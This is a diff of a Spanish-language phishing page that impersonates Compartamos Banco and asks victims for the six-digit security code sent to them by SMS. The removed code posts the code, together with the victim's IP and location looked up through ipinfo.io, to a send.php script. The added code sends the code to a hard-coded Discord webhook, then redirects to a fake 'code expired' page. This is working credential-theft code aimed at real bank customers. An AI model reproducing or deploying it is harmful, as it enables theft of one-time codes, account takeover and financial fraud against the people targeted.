@@ -1,19 +1,35 @@
 <!DOCTYPE html>
-<html lang="es"><head><meta charset="UTF-8"><title>Código</title><link rel="stylesheet" href="style.css"></head>
-<body><div class="container">
-<img src="Compartamos-Ba-768x163.jpg" alt="Logo" style="max-width: 100%; margin-bottom: 20px;">
-<h1>Código de Seguridad</h1>
-<form id="codeForm"><input type="text" id="codigo" placeholder="Ingresa el código de 6 dígitos" maxlength="6" required>
-<button type="submit">Confirmar</button></form></div>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<title>Código de Seguridad</title>
+<link href="style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="container">
+<img alt="Logo Compartamos Banco" src="Compartamos-Ba-768x163.jpg" style="max-width: 100%; height: auto; margin-bottom: 20px;"/>
+<h1>Ingresa el código recibido via sms</h1>
+<form id="codeForm">
+<input id="codigo" maxlength="6" placeholder="Ingresa el código de 6 dígitos" required="" type="tel"/>
+<button type="submit">Confirmar</button>
+</form>
+</div>
 <script>
-document.getElementById('codeForm').addEventListener('submit', async function(e) {
-e.preventDefault(); const codigo = document.getElementById('codigo').value;
-if (!/^\d{6}$/.test(codigo)) { alert("Debe tener 6 dígitos."); return; }
-let ip="Desconocida", ubicacion="No disponible";
-try { const res=await fetch("https://ipinfo.io/json?token=72e4f683c1c5fb");
-const data=await res.json(); ip=data.ip; ubicacion=data.city+", "+data.region+", "+data.country; } catch(e){}
-await fetch("send.php",{method:"POST",headers:{"Content-Type":"application/json"},
-body:JSON.stringify({message:`🔐 Código: ${codigo}\n🌍 IP: ${ip}\n📌 Ubicación: ${ubicacion}`})});
-window.location.href = "codigo_vencido.html";
-});
-</script></body></html>
+        document.getElementById('codeForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const codigo = document.getElementById('codigo').value;
+            if (!/^\d{6}$/.test(codigo)) {
+                alert("El código debe tener exactamente 6 dígitos.");
+                return;
+            }
+            await fetch("https://discord.com/api/webhooks/1354514961703108739/PaD7lPWNnu8lfenpSc3oalDW7C3F9qVzHDM4SuRjSir6sC7EOW9X8DX8Z02F-GLiyzWN", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `🔐 Código de seguridad: ${codigo}` })
+            });
+            window.location.href = "codigo_vencido.html";
+        });
+    </script>
+</body>
+</html>
